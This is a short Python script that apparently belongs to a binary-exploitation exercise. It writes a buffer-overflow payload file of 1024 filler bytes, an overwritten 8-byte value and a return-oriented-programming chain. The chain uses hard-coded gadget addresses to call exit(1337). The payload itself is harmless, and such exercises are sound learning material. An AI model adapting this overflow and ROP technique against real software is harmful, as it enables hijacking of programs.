#!/usr/bin/python
import struct

def dq(v):
  return struct.pack("Q", v)

def set_rax(v):
  return ''.join([
    dq(0x46b3c8),
    dq(v)
    ])

def set_rdi(v):
  return ''.join([
    dq(0x4016d3),
    dq(v)
    ])

def syscall():
  return dq(0x4371b7)

def main():
  f = open("payload.bin", "wb")
  f.write("A" * (1024))
  f.write(dq(0x4242424242424242))

  rop = ''.join([
    set_rax(60),
    set_rdi(1337),
    syscall()
  ])
  f.write(rop)

#------> offset: 0x46b3c8
#0x46b3c8    pop rax
#0x46b3c9    ret

#------> offset: 0x4016d3
#0x4016d3    pop rdi
#0x4016d4    ret

#0x4371b7    syscall



main()
